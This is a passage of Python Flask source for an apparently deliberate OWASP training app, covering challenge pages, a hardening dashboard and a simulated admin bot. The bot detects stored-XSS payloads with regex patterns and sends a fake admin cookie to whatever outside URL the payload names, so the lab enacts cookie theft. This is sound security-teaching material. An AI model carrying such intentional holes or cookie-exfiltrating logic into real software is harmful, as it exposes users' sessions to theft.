    d.execute("INSERT INTO cspreport(ts,report) VALUES(?,?)",
              (time.time(), request.get_data(as_text=True)[:2000]))
    d.commit()
    return ("", 204)


@app.route("/hardening")
def hardening():
    # live self-check: fetch our own homepage and inspect the response headers
    present = {}
    try:
        with urllib.request.urlopen("http://127.0.0.1:5000/", timeout=3) as r:
            hdrs = {k.lower(): v for k, v in r.headers.items()}
        present = {h: (h.lower() in hdrs) for h in REQUIRED_HEADERS}
    except Exception:
        present = {h: False for h in REQUIRED_HEADERS}
    events = {r["event"] for r in db().execute("SELECT DISTINCT event FROM audit")}
    logging_status = {e: (e in events) for e in EXPECTED_EVENTS}
    csp_count = db().execute("SELECT COUNT(*) n FROM cspreport").fetchone()["n"]
    return page("""<div class=card><h2>Hardening dashboard</h2>
      <p class=muted>Day-3 defensive targets. These start red; fix them in
      <code>app.py</code> and reload to watch them go green.</p>
      <h3>Security response headers</h3>
      <table><tr><th>Header</th><th>Status</th></tr>
      {% for h,ok in present.items() %}<tr><td>{{h}}</td>
      <td><span class="pill {{'ok' if ok else 'no'}}">{{'present' if ok else 'missing'}}</span></td></tr>
      {% endfor %}</table>
      <p class=muted>Fix: implement <code>set_headers()</code> (after_request) and set
      <code>SECURITY_HEADERS_ENABLED=True</code>. Add a CSP with
      <code>report-uri /csp-report</code>.</p></div>
      <div class=card><h3>CSP violation reports</h3>
      <p>{{csp_count}} report(s) received at <code>/csp-report</code>.</p></div>
      <div class=card><h3>Security logging &amp; monitoring (A09)</h3>
      <table><tr><th>Expected event</th><th>Logged?</th></tr>
      {% for e,ok in logging_status.items() %}<tr><td>{{e}}</td>
      <td><span class="pill {{'ok' if ok else 'no'}}">{{'yes' if ok else 'never'}}</span></td></tr>
      {% endfor %}</table>
      <p class=muted>Fix: call <code>audit("&lt;event&gt;", detail)</code> at the
      security-relevant points (login success/failure, access_denied, admin_action).</p></div>""",
                present=present, logging_status=logging_status, csp_count=csp_count)


# --------------------------------------------------------------------------- #
# Challenge detail page: goal + "Start here" link + staggered hints
# --------------------------------------------------------------------------- #
@app.route("/challenge/<cid>")
def challenge_detail(cid):
    c = BY_ID.get(cid)
    if not c:
        return page("<div class=card><p>No such challenge.</p>"
                    "<a href=/scoreboard>&larr; back to scoreboard</a></div>"), 404
    done = cid in solved_ids()
    url, label, note = START.get(cid, ("/", "the app", None))
    # Hints render here (staggered, client-side); flag/fix only appear once solved.
    return page("""<div class=card>
      <p><a href="/scoreboard">&larr; All challenges</a></p>
      <h2>{{c['title']}}
        {% if done %}<span class="pill ok">SOLVED</span>{% else %}<span class="pill no">open</span>{% endif %}</h2>
      <p class=muted>{{catname}} &middot; {{c['diff']}}</p>
      <p><b>Goal:</b> {{c['goal']}}</p>
      {% if note %}<p class=warn>&#9888; {{note}}</p>{% endif %}
      <p><a class=btn href="{{start_url}}">&#9654; Start here &mdash; {{start_label}}</a></p>
      <p class=muted>Exploit the feature; the server detects the solve and this page turns
      green. There's no flag to submit.</p></div>
      <div class=card><h3>Hints</h3>
      <p class=muted>Stuck? Reveal them one at a time &mdash; each is more specific than the last.</p>
      <div id=hints class=grid>
      {% for h in c['hints'] %}<div class=hint {% if not loop.first %}hidden{% endif %}>
        <b>Hint {{loop.index}}.</b> {{h}}</div>{% endfor %}</div>
      <p class=row><button id=moreHint type=button>Show next hint</button>
      <span id=hintCount class=muted></span></p></div>
      {% if done %}<div class=card><p class=flag>{{c['flag']}}</p>
      <p class=muted><b>Fix:</b> {{c['fix']}}</p></div>{% endif %}
      <script src="/assets/hints.js"></script>""",
                c=c, done=done, catname=CAT_NAMES.get(c["cat"], c["cat"]),
                start_url=url, start_label=label, note=note)


# --------------------------------------------------------------------------- #
# Scoreboard (the challenge index)
# --------------------------------------------------------------------------- #
@app.route("/scoreboard")
def scoreboard():
    done = solved_ids()
    return page("""<div class=card><h2>Scoreboard</h2>
      <p>{{done|length}} / {{all|length}} solved.</p>
      <p class=muted>Click a challenge to open it: you'll get the goal, a
      <b>Start here</b> link to the vulnerable feature, and hints you reveal one at a
      time. Exploit it and the row turns green automatically.</p>
      <table><tr><th>OWASP</th><th>Challenge</th><th>Diff</th><th>Status</th><th>Details</th></tr>
      {% for c in all %}<tr class="{{'ok' if c['id'] in done else ''}}">
        <td>{{c['cat']}}</td>
        <td><b><a href="/challenge/{{c['id']}}">{{c['title']}}</a></b>
            <br><small class=muted>{{c['goal']}}</small></td>
        <td>{{c['diff']}}</td>
        <td>{% if c['id'] in done %}<span class="pill ok">SOLVED</span>{% else %}<span class="pill no">open</span>{% endif %}</td>
        <td><a href="/challenge/{{c['id']}}">Open &rarr;</a>
        {% if c['id'] in done %}<br><span class=flag>{{c['flag']}}</span><br><small class=muted>Fix: {{c['fix']}}</small>{% endif %}</td>
      </tr>{% endfor %}</table></div>""", all=CHALLENGES, done=done)


# --------------------------------------------------------------------------- #
# Admin review bot: stored XSS must EXFILTRATE the admin cookie (not just alert)
# --------------------------------------------------------------------------- #
def admin_bot():
    # a REAL sink: a live <script> tag, or a live tag carrying an on*= handler
    # (escaped output has no '<', so it never matches).
    sink_re = re.compile(r"<script|<[a-z][^>]*[\s/]on[a-z]+\s*=")
    url_re = re.compile(r'https?://[^\s\'"<>()]+')
    while True:
        try:
            c = sqlite3.connect(DB)
            c.row_factory = sqlite3.Row
            for row in c.execute("SELECT * FROM comments WHERE seen=0").fetchall():
                body = row["body"] or ""
                low = body.lower()
                # the admin "views" the ticket: judge what the page actually renders,
                # so output-encoding the comment (the fix) stops the payload firing.
                rendered = str(render_comment(row["author"] or "", body)).lower()
                fired = bool(sink_re.search(rendered))
                exfil = "document.cookie" in low
                m = url_re.search(body)
                if fired and exfil and m:
                    # the admin's browser "runs" the payload: cookie leaves to the URL.
                    target = m.group(0).split("?")[0].rstrip("+'\" )")
                    try:
                        urllib.request.urlopen(
                            target + "?c=" + urllib.parse.quote(ADMIN_COOKIE), timeout=3)
                    except Exception:
                        pass
                    c.execute("INSERT OR IGNORE INTO solved(cid,ts) VALUES('xss_stored',?)", (time.time(),))
                c.execute("UPDATE comments SET seen=1 WHERE id=?", (row["id"],))
            c.commit()
            c.close()
        except Exception:
            pass
        time.sleep(2)


if __name__ == "__main__":
    # With the reloader on, Werkzeug runs this module in a watcher AND a worker
    # process; seeding, loot and the admin bot belong only to the worker (or to a
    # plain no-reload run).
    is_worker = (not USE_RELOADER) or os.environ.get("WERKZEUG_RUN_MAIN") == "true"
    if is_worker:
        prepare_runtime_files()
        # Day 3: keep an existing DB (and its solves) unless RESET=1. Default mode
        # has no persistent DB, so this reseeds on every boot as before.
        keep = PERSIST and os.path.exists(DB) and os.environ.get("RESET") != "1"
        if not keep:
            seed()
        threading.Thread(target=admin_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True,
            use_reloader=USE_RELOADER)
